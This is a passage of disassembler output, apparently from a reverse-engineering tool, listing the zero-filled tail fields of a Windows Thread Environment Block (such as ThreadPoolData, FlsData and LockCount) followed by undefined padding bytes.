                             IdealProcessorValue
        ffdfff74 00 00 00 00     ddw        0h
                             GuaranteedStackBytes
        ffdfff78 00 00 00 00     ddw        0h
                             ReservedForPerf
        ffdfff7c 00 00 00 00     void *     00000000
                             ReservedForOle
        ffdfff80 00 00 00 00     void *     00000000
                             WaitingOnLoaderLock
        ffdfff84 00 00 00 00     ddw        0h
                             SavedPriorityState
        ffdfff88 00 00 00 00     void *     00000000
                             SoftPatchPtr1
        ffdfff8c 00 00 00 00     void *     00000000
                             ThreadPoolData
        ffdfff90 00 00 00 00     void *     00000000
                             TlsExpansionSlots
        ffdfff94 00 00 00 00     void *     00000000
                             MuiGeneration
        ffdfff98 00 00 00 00     ddw        0h
                             IsImpersonating
        ffdfff9c 00 00 00 00     ddw        0h
                             NlsCache
        ffdfffa0 00 00 00 00     void *     00000000
                             pShimData
        ffdfffa4 00 00 00 00     void *     00000000
                             HeapVirtualAffinity
        ffdfffa8 00 00 00 00     ddw        0h
                             CurrentTransactionHandle
        ffdfffac 00 00 00 00     void *     00000000
                             ActiveFrame
        ffdfffb0 00 00 00 00     void *     00000000
                             FlsData
        ffdfffb4 00 00 00 00     void *     00000000
                             PreferredLanguages
        ffdfffb8 00 00 00 00     void *     00000000
                             UserPrefLanguages
        ffdfffbc 00 00 00 00     void *     00000000
                             MergedPrefLanguages
        ffdfffc0 00 00 00 00     void *     00000000
                             MuiImpersonation
        ffdfffc4 00 00 00 00     ddw        0h
                             CrossTebFlags
        ffdfffc8 00 00           ushort     0h
                             SameTebFlags
        ffdfffca 00 00           ushort     0h
                             TxnScopeEnterCallback
        ffdfffcc 00 00 00 00     void *     00000000
                             TxnScopeExitCallback
        ffdfffd0 00 00 00 00     void *     00000000
                             TxnScopeContext
        ffdfffd4 00 00 00 00     void *     00000000
                             LockCount
        ffdfffd8 00 00 00 00     ddw        0h
        ffdfffdc 00              ??         00h
        ffdfffdd 00              ??         00h
        ffdfffde 00              ??         00h
        ffdfffdf 00              ??         00h
                             ResourceRetValue
        ffdfffe0 00 00 00 00     void *     00000000
        ffdfffe4 00              ??         00h
        ffdfffe5 00              ??         00h
        ffdfffe6 00              ??         00h
        ffdfffe7 00              ??         00h
        ffdfffe8 00              ??         00h
        ffdfffe9 00              ??         00h
        ffdfffea 00              ??         00h
        ffdfffeb 00              ??         00h
        ffdfffec 00              ??         00h
        ffdfffed 00              ??         00h
        ffdfffee 00              ??         00h
        ffdfffef 00              ??         00h
        ffdffff0 00              ??         00h
        ffdffff1 00              ??         00h
        ffdffff2 00              ??         00h
        ffdffff3 00              ??         00h
        ffdffff4 00              ??         00h
        ffdffff5 00              ??         00h
        ffdffff6 00              ??         00h
        ffdffff7 00              ??         00h
        ffdffff8 00              ??         00h
        ffdffff9 00              ??         00h
        ffdffffa 00              ??         00h
        ffdffffb 00              ??         00h
        ffdffffc 00              ??         00h
        ffdffffd 00              ??         00h
        ffdffffe 00              ??         00h
        ffdfffff 00              ??         00h
